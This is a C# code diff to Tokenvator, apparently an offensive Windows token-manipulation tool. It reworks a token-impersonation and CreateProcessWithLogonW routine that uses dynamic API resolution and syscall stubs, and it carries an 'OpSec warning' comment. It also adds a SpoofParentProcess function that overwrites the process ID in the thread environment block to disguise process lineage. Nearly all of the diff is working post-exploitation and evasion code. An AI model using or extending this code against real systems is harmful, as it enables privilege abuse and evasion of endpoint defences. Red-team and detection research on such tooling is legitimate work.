@@ -30,37 +30,18 @@ namespace Tokenvator.Plugins.Execution
         [HandleProcessCorruptedStateExceptions]
         public static bool CreateProcessWithLogonW(IntPtr phNewToken, string name, string arguments)
         {
-            ////////////////////////////////////////////////////////////////////////////////
-            // advapi32.ImpersonateLoggedOnUser(phNewToken)
-            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
             IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+
             IntPtr hImpersonateLoggedOnUser = Generic.GetExportAddress(hadvapi32, "ImpersonateLoggedOnUser");
-            MonkeyWorks.advapi32.ImpersonateLoggedOnUser fImpersonateLoggedOnUser = (MonkeyWorks.advapi32.ImpersonateLoggedOnUser)Marshal.GetDelegateForFunctionPointer(hImpersonateLoggedOnUser, typeof(MonkeyWorks.advapi32.ImpersonateLoggedOnUser));
+            var fImpersonateLoggedOnUser = (MonkeyWorks.advapi32.ImpersonateLoggedOnUser)Marshal.GetDelegateForFunctionPointer(hImpersonateLoggedOnUser, typeof(MonkeyWorks.advapi32.ImpersonateLoggedOnUser));
 
-            bool retVal = false;
-            try
-            {
-                retVal = fImpersonateLoggedOnUser(phNewToken);
-            }
-            catch (Exception ex)
-            {
-                Misc.GetExceptionMessage(ex, "ImpersonateLoggedOnUser");
-                return false;
-            }
-
-
-            if (IntPtr.Zero != phNewToken && !retVal)
-            {
-                Misc.GetWin32Error("ImpersonateLoggedOnUser");
-                return false;
-            }
-
-            ////////////////////////////////////////////////////////////////////////////////
-            // advapi32.RevertToSelf();
-            ////////////////////////////////////////////////////////////////////////////////
             IntPtr hRevertToSelf = Generic.GetExportAddress(hadvapi32, "RevertToSelf");
-            MonkeyWorks.advapi32.RevertToSelf fRevertToSelf = (MonkeyWorks.advapi32.RevertToSelf)Marshal.GetDelegateForFunctionPointer(hRevertToSelf, typeof(MonkeyWorks.advapi32.RevertToSelf));
+            var fRevertToSelf = (MonkeyWorks.advapi32.RevertToSelf)Marshal.GetDelegateForFunctionPointer(hRevertToSelf, typeof(MonkeyWorks.advapi32.RevertToSelf));
 
+            IntPtr hCreateProcessWithLogonW = Generic.GetExportAddress(hadvapi32, "CreateProcessWithLogonW");
+            var fCreateProcessWithLogonW = (MonkeyWorks.advapi32.CreateProcessWithLogonW)Marshal.GetDelegateForFunctionPointer(hCreateProcessWithLogonW, typeof(MonkeyWorks.advapi32.CreateProcessWithLogonW));
+            
             if (name.Contains("\\"))
             {
                 name = System.IO.Path.GetFullPath(name);
@@ -99,10 +80,28 @@ namespace Tokenvator.Plugins.Execution
             }
 
             ////////////////////////////////////////////////////////////////////////////////
+            // advapi32.ImpersonateLoggedOnUser(phNewToken)
+            ////////////////////////////////////////////////////////////////////////////////
+            bool retVal = false;
+            try
+            {
+                retVal = fImpersonateLoggedOnUser(phNewToken);
+            }
+            catch (Exception ex)
+            {
+                Misc.GetExceptionMessage(ex, "ImpersonateLoggedOnUser");
+                return false;
+            }
+
+            if (IntPtr.Zero != phNewToken && !retVal)
+            {
+                Misc.GetWin32Error("ImpersonateLoggedOnUser");
+                return false;
+            }
+
+            ////////////////////////////////////////////////////////////////////////////////
             // advapi32.CreateProcessWithLogonW("i","j","k", Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY, name, name, Winbase.CREATION_FLAGS.CREATE_DEFAULT_ERROR_MODE, IntPtr.Zero, Environment.CurrentDirectory, ref startupInfo, out processInformation)
             ////////////////////////////////////////////////////////////////////////////////
-            IntPtr hCreateProcessWithLogonW = Generic.GetExportAddress(hadvapi32, "CreateProcessWithLogonW");
-            MonkeyWorks.advapi32.CreateProcessWithLogonW fCreateProcessWithLogonW = (MonkeyWorks.advapi32.CreateProcessWithLogonW)Marshal.GetDelegateForFunctionPointer(hCreateProcessWithLogonW, typeof(MonkeyWorks.advapi32.CreateProcessWithLogonW));
 
             Console.WriteLine("[*] CreateProcessWithLogonW");
             Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO
@@ -115,7 +114,9 @@ namespace Tokenvator.Plugins.Execution
             try
             {
                 retVal = fCreateProcessWithLogonW(
-                string.Empty, string.Empty, string.Empty,
+                //OpSec warning, change these
+                //This used to work with string.empty, another MS silent patch
+                "tv", "tv", "tv",
                 Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
                 name,
                 name,
@@ -148,7 +149,10 @@ namespace Tokenvator.Plugins.Execution
             
             Console.WriteLine(" [+] Created process: {0}", processInformation.dwProcessId);
             Console.WriteLine(" [+] Created thread:  {0}", processInformation.dwThreadId);
-            Misc.GetWin32Error("CreateProcessWithLogonW");
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // advapi32.RevertToSelf();
+            ////////////////////////////////////////////////////////////////////////////////
             try
             {
                 fRevertToSelf();
@@ -175,7 +179,9 @@ namespace Tokenvator.Plugins.Execution
         [HandleProcessCorruptedStateExceptions]
         public static bool CreateProcessWithLogonW(string username, string domain, string password, string command, string arguments)
         {
+            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
             IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+
             IntPtr hCreateProcessWithLogonW = Generic.GetExportAddress(hadvapi32, "CreateProcessWithLogonW");
             MonkeyWorks.advapi32.CreateProcessWithLogonW fCreateProcessWithLogonW = (MonkeyWorks.advapi32.CreateProcessWithLogonW)Marshal.GetDelegateForFunctionPointer(hCreateProcessWithLogonW, typeof(MonkeyWorks.advapi32.CreateProcessWithLogonW));
 
@@ -280,7 +286,7 @@ namespace Tokenvator.Plugins.Execution
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[-] RevertToSelf Generated an Exception");
+                Console.WriteLine("[-] CreateProcessWithTokenW Generated an Exception");
                 Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
@@ -301,6 +307,73 @@ namespace Tokenvator.Plugins.Execution
             }
             Console.WriteLine(" [+] Created process: {0}", processInformation.dwProcessId);
             Console.WriteLine(" [+] Created thread:  {0}", processInformation.dwThreadId);
+            return true;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// https://gist.github.com/tyranid/abad5008f5768b7718cd11d1a76a3763
+        /// https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
+        /// </summary>
+        /// <param name="parent"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
+        public static bool SpoofParentProcess(uint parent, out uint previousPid)
+        {
+            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
+
+            IntPtr hGetCurrentProcessId = Generic.GetExportAddress(hkernel32, "GetCurrentProcessId");
+            var fGetCurrentProcessId = (MonkeyWorks.kernel32.GetCurrentProcessId)Marshal.GetDelegateForFunctionPointer(hGetCurrentProcessId, typeof(MonkeyWorks.kernel32.GetCurrentProcessId));
+
+            IntPtr hNtQueryInformationThread = Generic.GetSyscallStub("NtQueryInformationThread");
+            var fSyscallNtQueryInformationThread = (MonkeyWorks.ntdll.NtQueryInformationThread)Marshal.GetDelegateForFunctionPointer(hNtQueryInformationThread, typeof(MonkeyWorks.ntdll.NtQueryInformationThread));
+
+            IntPtr hGetCurrentThread = Generic.GetExportAddress(hkernel32, "GetCurrentThread");
+            var fGetCurrentThread = (MonkeyWorks.kernel32.GetCurrentThread)Marshal.GetDelegateForFunctionPointer(hGetCurrentThread, typeof(MonkeyWorks.kernel32.GetCurrentThread));
+
+            previousPid = fGetCurrentProcessId();
+
+            uint threadInformationLength = (uint)Marshal.SizeOf(typeof(MonkeyWorks.ntdll._THREAD_BASIC_INFORMATION));
+            IntPtr threadInformation = Marshal.AllocHGlobal((int)threadInformationLength);
+
+            MonkeyWorks.ntdll._THREAD_BASIC_INFORMATION threadBasicInformation;
+
+            uint returnLength = 0;
+            uint ntRetVal;
+            try
+            {
+                ntRetVal = fSyscallNtQueryInformationThread(
+                    fGetCurrentThread(), 
+                    MonkeyWorks.ntdll._THREAD_INFORMATION_CLASS.ThreadBasicInformation, 
+                    threadInformation, 
+                    threadInformationLength, 
+                    ref returnLength
+                );
+                threadBasicInformation = (MonkeyWorks.ntdll._THREAD_BASIC_INFORMATION)Marshal.PtrToStructure(threadInformation, typeof(MonkeyWorks.ntdll._THREAD_BASIC_INFORMATION));
+                //Misc.PrintStruct(threadBasicInformation);
+            }
+            catch (Exception ex)
+            {
+                Misc.GetExceptionMessage(ex, "NtQueryInformationThread");
+                return false;
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(threadInformation);
+            }
+
+            if (0 != ntRetVal)
+            {
+                Misc.GetNtError("NtQueryInformationThread", ntRetVal);
+                return false;
+            }
+
+            Console.WriteLine("[*] Modifying TEB");
+            IntPtr hPid = new IntPtr(threadBasicInformation.TebBaseAddress.ToInt64() + 0x40);
+            previousPid = (uint)Marshal.ReadInt32(hPid);
+            Console.Write("[*] Current PID: {0}, ", previousPid);
+            Marshal.WriteInt32(hPid, (int)parent);
+            Console.WriteLine("Updated PID: {0}", parent);
             return true;
         }
 
